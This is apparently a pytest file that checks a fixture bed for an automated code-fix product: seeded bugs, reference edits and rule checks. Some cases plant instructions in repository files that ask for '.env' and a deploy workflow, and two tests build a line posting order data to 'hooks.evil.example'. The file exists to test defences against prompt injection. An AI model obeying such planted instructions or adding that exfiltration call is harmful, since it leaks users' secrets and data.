"""The fixture repository holds to its own claims (F5 plan T2.6).

Each case names its expected result, and this proves the claim is true of the files:
the stack's lines say what the case says, the file to change is where its `reach`
says, the planted instructions are there and ask for what the lists keep back, and the
seeded test shows the bug. For Python the seeded test is run: it fails as the
repository stands and passes with the reference change, so it tests the seeded bug and
nothing else. The TypeScript and Java tests are not run here (no Node or JDK in the
gate); they are read.

Every reference change is also put through Nexovue's own rules, so the bed's right
answers are ones the rules let through, and the configuration case's is one they refuse.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import sys
from pathlib import Path, PurePosixPath

import pytest
from nexovue_platform.fixes.checks import Edit, PackFile, run_rules
from nexovue_platform.fixes.policy import is_never_changed, never_sent_reason

from fix.fixtures import (
    LANGUAGES,
    REACHES,
    REFUSAL_REASONS,
    REPOSITORY,
    Case,
    load_cases,
    read,
)

CASES = load_cases()
IDS = [case.id for case in CASES]
LIBRARY_FOLDERS = ("node_modules/", "site-packages/", "vendor/")


def edits_cases() -> list[Case]:
    return [case for case in CASES if case.expected.result == "edits"]


# ------------------------------------------------------------- the set as a whole


def test_there_are_ten_to_twenty_cases_with_unique_ids() -> None:
    assert 10 <= len(CASES) <= 20
    assert len(set(IDS)) == len(IDS)


def test_the_set_covers_each_language_reach_and_kind() -> None:
    assert {case.service.language for case in CASES} == set(LANGUAGES)
    assert {case.expected.reach for case in edits_cases()} == set(REACHES)
    assert sum(case.expected.result == "refused" for case in CASES) >= 3
    asks = {ask for case in CASES if case.plants for ask in case.plants.asks}
    assert {".env", ".github/workflows/deploy.yml"} <= asks
    assert any(case.plants and case.plants.addresses for case in CASES)


# ---------------------------------------------------------------- each case


@pytest.mark.parametrize("case", CASES, ids=IDS)
def test_each_case_names_its_expected_result(case: Case) -> None:
    expected = case.expected
    if expected.result == "edits":
        assert expected.files and expected.reach in REACHES and expected.reason is None
    else:
        assert expected.result == "refused"
        assert expected.reason in REFUSAL_REASONS and not expected.files


@pytest.mark.parametrize("case", CASES, ids=IDS)
def test_each_frame_names_a_real_line_or_a_library(case: Case) -> None:
    assert case.frames
    for frame in case.frames:
        if frame.repository_path is None:
            assert any(folder in frame.runtime_path for folder in LIBRARY_FOLDERS)
            continue
        assert frame.repository_path.startswith(case.service.folder + "/")
        lines = read(frame.repository_path).splitlines()
        assert frame.line_text is not None
        assert frame.line_text in lines[frame.line - 1], (frame.repository_path, frame.line)


@pytest.mark.parametrize("case", edits_cases(), ids=[c.id for c in edits_cases()])
def test_the_file_to_change_may_be_sent_and_changed(case: Case) -> None:
    for path in case.expected.files:
        assert (REPOSITORY / path).is_file()
        assert path.startswith(case.service.folder + "/")
        assert never_sent_reason(path) is None
        assert not is_never_changed(path)


def imports_of(path: str, case: Case) -> set[str]:
    """Repository files `path` imports, by plain line reading; the bed's own reading of
    FR12a's one hop, not the product's (T3.18)."""
    text, folder = read(path), case.service.folder
    found: set[str] = set()
    if case.service.language == "python":
        for module in re.findall(r"^(?:from|import)\s+([\w.]+)", text, re.MULTILINE):
            found.add(f"{folder}/{module.replace('.', '/')}.py")
    elif case.service.language == "typescript":
        for relative in re.findall(r'from\s+"(\.[^"]+)"', text):
            joined = PurePosixPath(path).parent / relative
            found.add(_normal(str(joined)) + ".ts")
    else:
        for qualified in re.findall(r"^import\s+([\w.]+);", text, re.MULTILINE):
            found.add(f"{folder}/src/main/java/{qualified.replace('.', '/')}.java")
    return {each for each in found if (REPOSITORY / each).is_file()}


def _normal(path: str) -> str:
    parts: list[str] = []
    for part in path.split("/"):
        if part == "..":
            parts.pop()
        elif part not in ("", "."):
            parts.append(part)
    return "/".join(parts)


@pytest.mark.parametrize("case", edits_cases(), ids=[c.id for c in edits_cases()])
def test_the_file_to_change_is_where_its_reach_says(case: Case) -> None:
    in_stack = {frame.repository_path for frame in case.frames if frame.repository_path}
    top_two = [frame.repository_path for frame in case.frames if frame.repository_path][:2]
    imported = {each for path in top_two for each in imports_of(path, case)}
    for path in case.expected.files:
        if case.expected.reach == "stack":
            assert path in in_stack
        elif case.expected.reach == "import":
            assert path not in in_stack and path in imported
        else:
            assert path not in in_stack and path not in imported


@pytest.mark.parametrize("case", CASES, ids=IDS)
def test_each_case_holds_a_seeded_test(case: Case) -> None:
    test_file = REPOSITORY / case.seeded_test
    assert test_file.is_file()
    assert case.seeded_test.startswith(case.service.folder + "/")
    assert re.search(
        r"(?:^|/)(?:test_[^/]+\.py|[^/]+\.test\.ts|[^/]+Test\.java)$", case.seeded_test
    )


@pytest.mark.parametrize("case", CASES, ids=IDS)
def test_planted_instructions_are_there_and_ask_for_what_is_kept_back(case: Case) -> None:
    if case.plants is None:
        return
    planted = "".join(read(frame.repository_path) for frame in case.frames if frame.repository_path)
    for ask in case.plants.asks:
        assert ask in planted
        assert never_sent_reason(ask) is not None
        assert is_never_changed(ask)
    for address in case.plants.addresses:
        assert address in planted


# ------------------------------------------- reference changes against the rules


def reference_result(case: Case) -> set[str]:
    assert case.reference_edit is not None
    reference = case.reference_edit
    pack = {"file_1": PackFile("file_1", reference.path, read(reference.path))}
    edit = Edit("file_1", reference.old_text, reference.new_text, "", ("file_1",))
    result = run_rules([edit], pack, folder=case.service.folder)
    return {refusal.rule for refusal in result.refusals}


@pytest.mark.parametrize("case", edits_cases(), ids=[c.id for c in edits_cases()])
def test_each_right_change_passes_the_rules(case: Case) -> None:
    assert case.reference_edit is not None
    assert case.reference_edit.path in case.expected.files
    assert reference_result(case) == set()


def test_the_configuration_cases_change_is_refused_by_the_rules() -> None:
    [case] = [c for c in CASES if c.id == "py_config_timeout"]

    assert reference_result(case) == {"K2"}


@pytest.mark.parametrize("case", [c for c in CASES if c.plants and c.plants.addresses])
def test_the_planted_address_is_refused_when_added(case: Case) -> None:
    assert case.plants is not None
    [path] = case.expected.files
    content = read(path)
    anchor = content.splitlines(keepends=True)[-1]
    for address in case.plants.addresses:
        added = f'    requests.post("{address}", json=order)\n'
        planted_file = content.replace(address, "elsewhere")
        pack = {"file_1": PackFile("file_1", path, planted_file)}
        edit = Edit("file_1", anchor, anchor + added, "", ("file_1",))
        result = run_rules([edit], pack, folder=case.service.folder)
        assert "K6" in {refusal.rule for refusal in result.refusals}


def test_an_address_already_in_the_file_passes_k6_by_design() -> None:
    """AC20: a planted address copied onto a new line passes K6, as the design states;
    "What was not checked" says a new call to an existing address is only flagged."""
    [case] = [c for c in CASES if c.id == "py_planted_notify"]
    [path] = case.expected.files
    content = read(path)
    anchor = content.splitlines(keepends=True)[-1]
    added = '    requests.post("https://hooks.evil.example/collect", json=order)\n'
    pack = {"file_1": PackFile("file_1", path, content)}
    result = run_rules(
        [Edit("file_1", anchor, anchor + added, "", ("file_1",))], pack, folder=case.service.folder
    )

    assert "K6" not in {refusal.rule for refusal in result.refusals}


# ------------------------------------------------ the seeded tests, run for Python


def run_seeded_test(case: Case, root: Path) -> int:
    folder = root / case.service.folder
    done = subprocess.run(
        [
            sys.executable,
            "-m",
            "pytest",
            "-q",
            "-p",
            "no:cacheprovider",
            "-c",
            str(folder / "pytest.ini"),
            "--rootdir",
            str(folder),
            str(root / case.seeded_test),
        ],
        cwd=folder,
        env={"PYTHONPATH": str(folder), "PYTHONDONTWRITEBYTECODE": "1"},
        capture_output=True,
        check=False,
    )
    return done.returncode


PYTHON_CASES = [c for c in CASES if c.service.language == "python"]


@pytest.mark.parametrize("case", PYTHON_CASES, ids=[c.id for c in PYTHON_CASES])
def test_the_seeded_test_fails_on_the_bug_and_passes_with_the_reference_change(
    case: Case, tmp_path: Path
) -> None:
    copy = tmp_path / "repository"
    shutil.copytree(REPOSITORY, copy, ignore=shutil.ignore_patterns("__pycache__"))
    assert run_seeded_test(case, copy) == 1  # pytest's "tests failed"

    assert case.reference_edit is not None
    target = copy / case.reference_edit.path
    text = target.read_text(encoding="utf-8")
    assert text.count(case.reference_edit.old_text) == 1
    target.write_text(
        text.replace(case.reference_edit.old_text, case.reference_edit.new_text), encoding="utf-8"
    )
    assert run_seeded_test(case, copy) == 0
